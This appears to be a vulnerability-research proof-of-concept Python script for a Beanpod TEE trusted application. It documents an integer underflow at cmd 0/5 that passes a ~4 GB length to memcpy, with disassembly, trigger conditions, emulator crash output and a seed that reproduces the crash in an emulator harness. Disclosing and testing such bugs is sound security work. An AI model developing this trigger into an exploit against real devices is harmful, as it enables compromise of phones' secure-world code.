#!/usr/bin/env python3
"""
PoC: Integer underflow → heap buffer overflow in 08010203000000000000000000000000.ta (Beanpod TA)

VULNERABILITY
=============
Binary : rootfs/08010203000000000000000000000000.ta  (ARM 32-bit, Beanpod TEE)
Command: TA_InvokeCommandEntryPoint  cmd=0 (or cmd=5)
Type   : Integer underflow → out-of-bounds memcpy (~4 GB write)

ROOT CAUSE
==========
The handler for cmd 0/5 (entry at 0xb488) parses the input buffer:

  [0..3]  outer_tag    (4 bytes, ignored by trigger path)
  [4..7]  type         (4 bytes, little-endian uint32, read by 0xe388)
  [8+]    data

When type == 0x80, the code calls the sub-function at 0xa598:

  0xb844  add r0, sp, #0x10
  0xb848  bl  #0xa598             ; allocates 4-byte heap buffer
                                  ; [sp+0x10] = malloc'd ptr  (data_ptr)
                                  ; [sp+0x14] = 4             (data_size)

Required output size becomes sb = data_size + 8 = 12.

If the caller-supplied output buffer is smaller than sb (< 12) the 'lo'
(unsigned less-than) conditional is true.  At 0xb764:

  0xb764  sublo  r3, r3, #8       ; output_size(4) - 8 → 0xFFFFFFFC  ← WRAP!
  0xb768  strlo  r3, [sp, #0x14]  ; overwrite data_size with 0xFFFFFFFC

The corrupted size is then passed directly to memcpy:

  0xb790  ldr  r2, [sp, #0x14]   ; r2 = 0xFFFFFFFC
  0xb794  mov  r1, r4            ; r1 = data_ptr  (non-null — malloc succeeded)
  0xb798  bl   #0x9680           ; memcpy(output_buf+8, data_ptr, 0xFFFFFFFC)
                                 ; → reads/writes ~4 GB → heap overflow

EMULATOR CRASH OUTPUT (confirmed)
==================================
  [=] memcpy 0xfffffffc from 0xaaaaa020 to 0xbbbbf008
  [x] [lr: 0xb79c] [memcpy] out-of-bound read on address 0xaaaaa020, size 0xfffffffc!!
  [x] CPU Context:
  [x]   r0  : 0xbbbbf008    ← dst = output_buf + 8  (8 bytes past the 4-byte buffer)
  [x]   r1  : 0xaaaaa020    ← src = malloc'd 4-byte data buffer
  [x]   r2  : 0xfffffffc    ← len = 4GB (integer underflow)
  [x]   lr  : 0xb79c        ← return addr of memcpy call at 0xb798
  [x]   pc  : 0xdeadbeee    ← emulator CRASH_PC_2 sentinel

TRIGGER CONDITIONS
==================
  - cmd   : 0  (or 5)
  - ptypes: 0x65  →  param[0]=MEMREF_INOUT(5), param[1]=MEMREF_OUTPUT(6)
  - param[0].buf  : bytes[0..3]=<any>, bytes[4..7]=\\x80\\x00\\x00\\x00 (type=0x80)
  - param[1].size : < 8  (e.g. 4 bytes → triggers the underflow)

HOW TO REPRODUCE
================
  cd /srv/emulator
  ./fuzz.sh /srv/beanpod/harness/0801_poc/ \\
            /srv/beanpod/harness/0801_poc/in/poc_seed

Or run this script:
  cd /srv/emulator
  python3 poc_08010203.py
"""

import subprocess
import sys
import os

SEED = (
    b"\x00\x00\x00\x00"   # outer_tag (any 4 bytes)
    + b"\x80\x00\x00\x00" # type = 0x80  →  triggers vulnerable 0xa598 path
    + b"\x00" * 8         # padding
)

HARNESS = "/srv/beanpod/harness/0801_poc/harness.py"
TA      = "rootfs/08010203000000000000000000000000.ta"
SEED_F  = "/tmp/poc_08010203_seed"

def main():
    if not os.path.isfile("/.dockerenv"):
        print("[!] Must run inside the emulator Docker container.")
        print("    Execute: ./run-docker.sh")
        sys.exit(1)

    if not os.path.isfile(TA):
        print(f"[!] TA not found at {TA}")
        sys.exit(1)

    print("[*] Writing exploit seed...")
    with open(SEED_F, "wb") as f:
        f.write(SEED)
    print(f"    {SEED_F}: {SEED.hex()}")

    print("\n[*] Triggering: cmd=0, ptypes=0x65")
    print("    param[0].buf  = \\x00\\x00\\x00\\x00 + \\x80\\x00\\x00\\x00 + padding")
    print("    param[1].size = 4  (tiny output buffer → underflow at 0xb764)")
    print()

    print("python3", "-m", "emulate",
            "--fuzz_replay", SEED_F,
            "--fuzz_harness", HARNESS,
            TA,
    )

    result = subprocess.run(
        [
            "python3", "-m", "emulate",
            "--fuzz_replay", SEED_F,
            "--fuzz_harness", HARNESS,
            TA,
        ],
        capture_output=True,
        text=True,
    )

    crash_lines = [l for l in result.stderr.splitlines() if "[x]" in l]
    if crash_lines:
        print("[+] CRASH DETECTED:")
        for l in crash_lines[:15]:
            print(f"    {l.strip()}")
        if "0xfffffffc" in result.stderr or "0xFFFFFFFC" in result.stderr.upper():
            print()
            print("[+] Integer underflow confirmed: memcpy called with size 0xFFFFFFFC (~4 GB)")
            print("[+] Bug: 08010203 TA cmd=0 handler, 0xb764: sublo r3, r3, #8  (underflow)")
    else:
        print("[-] No crash detected — check output:")
        print(result.stderr[-2000:])


if __name__ == "__main__":
    main()
